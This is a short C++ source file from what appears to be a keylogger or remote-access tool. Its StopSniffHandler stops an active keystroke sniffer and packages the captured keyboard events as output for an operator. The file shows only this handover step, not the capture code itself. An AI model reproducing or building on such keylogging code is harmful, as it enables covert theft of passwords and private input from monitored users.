#include "StopSniffHandler.hpp"

#include "ActiveKeySniff.hpp"
#include "Products/KeyboardEventsTypedProduct.hpp"

void StopSniffHandler::run()
{
	ActiveKeySniff::stop();

	append(std::make_unique<KeyboardEventsTypedProduct>(std::move(ActiveKeySniff::g_keyboard_events)));
	finished();
}
